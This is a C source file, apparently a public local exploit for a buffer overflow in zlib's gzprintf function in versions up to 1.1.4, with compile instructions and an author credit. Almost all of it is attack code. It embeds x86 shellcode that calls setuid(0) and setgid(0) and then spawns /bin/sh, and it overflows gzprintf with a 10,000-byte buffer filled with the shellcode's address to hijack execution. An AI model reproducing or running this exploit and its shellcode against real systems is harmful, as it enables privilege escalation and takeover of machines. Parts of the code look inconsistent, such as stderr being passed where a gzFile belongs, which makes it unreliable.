
C local exploit for zlib <= 1.1.4
/      just for fun..not for root :)
\
/   Usage: gcc -o zlib zlib.c -lz
\
/   by CrZ [crazy_einstein@yahoo.com] lbyte
[lbyte.void.ru]
*/


#include <zlib.h>
#include <errno.h>
#include <stdio.h>


int main(int argc, char **argv) {
        char shell[]=
                "\x90\x90\x90\x90\x90\x90\x90\x90"
                "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
                "\xb0\x2e\xcd\x80\xeb\x15\x5b\x31"
                "\xc0\x88\x43\x07\x89\x5b\x08\x89"
                "\x43\x0c\x8d\x4b\x08\x31\xd2\xb0"
                "\x0b\xcd\x80\xe8\xe6\xff\xff\xff"
                "/bin/sh";
        gzFile f;
        int ret;
        long xret;
        char cret[10];
        char badbuff[10000];
        int i;

        sprintf(badbuff,"%p",shell);
        sscanf(badbuff,"0x%x",&xret);

        printf("[>] exploiting...\n");

        if(!(f = gzopen("/dev/null", "w"))) {
                perror("/dev/null");
                exit(1);
        }

        printf("[>] xret = 0x%x\n",xret);


sprintf(cret,"%c%c%c%c",(xret&0xff)+4,(xret>>8)&0xff,

(xret>>16)&0xff,(xret>>24)&0xff);

        bzero(badbuff,sizeof(badbuff));

        for(i=0;i<5000;i+=4) strcat(badbuff,cret);

        setuid(0);
        setgid(0);
        ret = gzprintf(stderr, "%s", badbuff );
        setuid(0);
        setgid(0);
        printf(">Sent!..\n");
        printf("gzprintf -> %d\n", ret);
        ret = gzclose(f);
        printf("gzclose -> %d [%d]\n", ret, errno);

        exit(0);
}

